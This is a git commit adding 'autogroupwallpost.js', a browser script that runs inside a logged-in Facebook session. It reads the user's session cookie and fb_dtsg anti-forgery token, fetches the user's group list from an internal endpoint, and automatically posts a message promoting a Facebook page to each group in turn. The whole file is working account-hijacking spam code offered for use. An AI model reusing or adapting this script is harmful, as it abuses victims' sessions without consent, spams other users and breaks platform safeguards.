7b9d99667bf4a894d591112f781d38932a8f0188
Tumul2009 <tumul2005@gmail.com>
2013-11-30 14:03:58 +0600

    Create autogroupwallpost.js

---
+++ autogroupwallpost.js
@@ -0,0 +1,126 @@
+jx = {
+    getHTTPObject: function () {
+        var A = false;
+        if (typeof ActiveXObject != "undefined") try {
+            A = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (C) {
+            try {
+                A = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (B) {
+                A = false
+            }
+        } else if (window.XMLHttpRequest) try {
+            A = new XMLHttpRequest
+        } catch (C) {
+            A = false
+        }
+        return A
+    },
+    load: function (url, callback, format, method, opt) {
+        var http = this.init();
+        if (!http || !url) return;
+        if (http.overrideMimeType) http.overrideMimeType("text/xml");
+        if (!method) method = "GET";
+        if (!format) format = "text";
+        if (!opt) opt = {};
+        format = format.toLowerCase();
+        method = method.toUpperCase();
+        var now = "uid=" + (new Date).getTime();
+        url += url.indexOf("?") + 1 ? "&" : "?";
+        url += now;
+        var parameters = null;
+        if (method == "POST") {
+            var parts = url.split("?");
+            url = parts[0];
+            parameters = parts[1]
+        }
+        http.open(method, url, true);
+        var ths = this;
+        if (opt.handler) http.onreadystatechange = function () {
+            opt.handler(http)
+        };
+        else http.onreadystatechange = function () {
+            if (http.readyState == 4)
+                if (http.status == 200) {
+                    var result = "";
+                    if (http.responseText) result = http.responseText;
+                    if (format.charAt(0) == "j") {
+                        result = result.replace(/[\n\r]/g, "");
+                        result = eval("(" + result + ")")
+                    } else if (format.charAt(0) == "x") result = http.responseXML;
+                    if (callback) callback(result)
+                } else {
+                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
+                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
+                    if (error) error(http.status)
+                }
+        };
+        http.send(parameters)
+    },
+    bind: function (A) {
+        var C = {
+            "url": "",
+            "onSuccess": false,
+            "onError": false,
+            "format": "text",
+            "method": "GET",
+            "update": "",
+            "loading": "",
+            "loadingIndicator": ""
+        };
+        for (var B in C)
+            if (A[B]) C[B] = A[B];
+        if (!C.url) return;
+        var D = false;
+        if (C.loadingIndicator) {
+            D = document.createElement("div");
+            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
+            D.setAttribute("class", "loading-indicator");
+            D.innerHTML = C.loadingIndicator;
+            document.getElementsByTagName("body")[0].appendChild(D);
+            this.opt.loadingIndicator = D
+        }
+        if (C.loading) document.getElementById(C.loading).style.display = "block";
+        this.load(C.url, function (E) {
+            if (C.onSuccess) C.onSuccess(E);
+            if (C.update) document.getElementById(C.update).innerHTML = E;
+            if (D) document.getElementsByTagName("body")[0].removeChild(D);
+            if (C.loading) document.getElementById(C.loading).style.display = "none"
+        }, C.format, C.method, C)
+    },
+    init: function () {
+        return this.getHTTPObject()
+    }
+};
+var j = 0;
+var k = 0;
+var Gsuc = 0;
+var Gmsg = "Friends Like This awesOme HearT Touching Page https://www.facebook.com/pages/Kyun-Ki-Tum-Hi-Ho/722607351086829  \n I am sure it will touch Your Heart \n Check The Page \n And Hit Like ";
+var arr = new Array;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function autopostingfunc() {
+jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=group&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
+    var b = a;
+    var c = b.substring(b.indexOf("{"));
+    var d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+
+                postitok();
+    })
+}
+var a = document.body.innerHTML;
+var dts = document.getElementsByName("fb_dtsg")[0].value;
+var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function postitok() {
+
+ pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[Gsuc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(Gmsg) + "&xhpc_message=" + encodeURIComponent(Gmsg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=1&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
+    with(newx = new XMLHttpRequest) open("POST", "/ajax/updatestatus.php?__a=1"), send(pst);
+Gsuc++;
+    if (Gsuc > arr.length) {
+    } else setTimeout(postitok(),4000);
+
+}
+autopostingfunc();
